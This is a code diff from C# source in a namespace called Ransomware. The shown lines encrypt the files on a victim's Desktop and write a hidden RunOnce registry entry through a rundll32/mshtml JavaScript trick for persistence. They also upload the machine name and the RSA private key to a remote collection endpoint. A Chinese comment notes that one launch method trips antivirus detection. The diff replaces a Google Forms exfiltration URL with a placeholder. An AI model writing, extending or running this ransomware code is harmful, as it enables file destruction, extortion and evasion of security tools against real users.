@@ -76,15 +76,15 @@ namespace Ransomware
             File.WriteAllBytes("secretAES.txt", RSAObj.Encrypt(myKey, false));
 
             var rundll32Exploit = @"javascript:""\..\mshtml,RunHTMLApplication "";document.write();shell=new%20ActiveXObject(""wscript.shell"");shell.regwrite(""HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\adr"",""" + Application.ExecutablePath.Replace(@"\", @"\\") + @""");";
-            //System.Diagnostics.Process.Start("rundll32.exe", rundll32Exploit);
+            //System.Diagnostics.Process.Start("rundll32.exe", rundll32Exploit); <-- 引起防毒誤判為MSIL類型病毒
             ShellExecute(IntPtr.Zero, "open", "rundll32.exe", rundll32Exploit, "", ShowCommands.SW_HIDE);
 
             encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), myKey);
             
             NameValueCollection nc = new NameValueCollection();
-            nc["entry.877603287"] = Environment.MachineName;
-            nc["entry.615042698"] = RSAObj.ToXmlString(true);
-            new WebClient().UploadValues("https://docs.google.com/forms/d/1lVsy5tTnHE0sJ_zjZxJUNBF41VlCXWC0LFgSQvt3-qA/formResponse", nc);
+            nc["pc"] = Environment.MachineName;
+            nc["rsa"] = RSAObj.ToXmlString(true);
+            new WebClient().UploadValues("data recive", nc);
 
         }
     }
